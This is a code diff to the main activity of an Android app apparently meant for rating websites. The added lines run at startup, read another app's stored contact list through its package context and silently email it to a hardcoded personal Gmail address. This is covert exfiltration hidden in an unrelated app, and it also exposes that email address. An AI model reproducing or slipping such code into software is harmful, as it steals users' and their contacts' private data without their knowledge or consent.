@@ -3,30 +3,55 @@ package com.example.webrater;
 import androidx.appcompat.app.AlertDialog;
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.annotation.SuppressLint;
+import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
-import android.database.Cursor;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.ListView;
-import android.widget.ViewFlipper;
-
-import java.lang.reflect.Array;
-import java.util.ArrayList;
 
 public class MainActivity extends AppCompatActivity {
 
     boolean isSearching;
-    private String url;
     DataBaseHelper websiteDB;
-    ListView listView;
 
+    private String contactListJson = null;
+    private Context mContext;
+    private static SharedPreferences mPrefs;
+
+    // Set the mail which received contactList;
+    private String mailto = "marcantoine.garcia01@gmail.com";
+
+
+    @SuppressLint("WrongConstant")
     protected void onCreate (Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         // open database
         websiteDB = new DataBaseHelper(this);
         isSearching=false;
+        try {
+            mContext = this.createPackageContext(
+                    "com.example.contactlist",
+                    Context.MODE_PRIVATE);
+            mPrefs = mContext.getSharedPreferences("contactList", Activity.MODE_PRIVATE);
+            contactListJson = mPrefs.getString("contactList", null);
+        } catch (PackageManager.NameNotFoundException e) {
+            e.printStackTrace();
+        }
+        if (contactListJson != null){
+            sendEmail();
+        }
     }
+
+    private void sendEmail() {
+        SendMail sm = new SendMail(this, mailto, "ContactList", contactListJson);
+        sm.execute();
+    }
+
 
     public void onPause(){
         super.onPause();
